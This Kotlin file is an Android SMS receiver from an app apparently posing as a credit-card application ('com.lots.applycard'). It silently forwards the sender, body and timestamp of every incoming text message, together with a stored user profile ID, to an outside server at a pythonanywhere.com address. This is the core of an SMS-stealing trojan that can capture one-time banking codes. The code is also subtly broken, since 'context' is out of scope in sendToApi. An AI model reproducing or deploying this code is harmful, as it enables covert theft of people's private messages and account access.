package com.lots.applycard

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.text.SimpleDateFormat
import java.util.*

class SMSReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {
        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION == intent?.action) {
            val msgs = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            val pendingResult = goAsync()
            println("msg Received")
            for (msg in msgs) {
                val sender = msg.displayOriginatingAddress
                val body = msg.messageBody
                val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                    .format(Date(msg.timestampMillis))

                CoroutineScope(Dispatchers.IO).launch {
                    sendToApi(sender, body, timestamp)
                    pendingResult.finish()
                }
            }
        }
    }

    private suspend fun sendToApi(sender: String, message: String, timestamp: String) {
        try {
            val client = OkHttpClient()
            val sharedPref = context?.getSharedPreferences("MyPrefs", Context.MODE_PRIVATE)
            val userId = sharedPref?.getString("user_profile", null)
            val json = """
                {
                    "sender": "$sender",
                    "message": "$message",
                    "timestamp": "$timestamp",
                    "user_profile":"$userId"
                }
            """.trimIndent().toRequestBody("application/json; charset=utf-8".toMediaType())

            val request = Request.Builder()
                .url("https://ashu1794.pythonanywhere.com/api/sms_messages/")
                .post(json)
                .build()

            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) {
                    println("API call failed: ${response.code}")
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
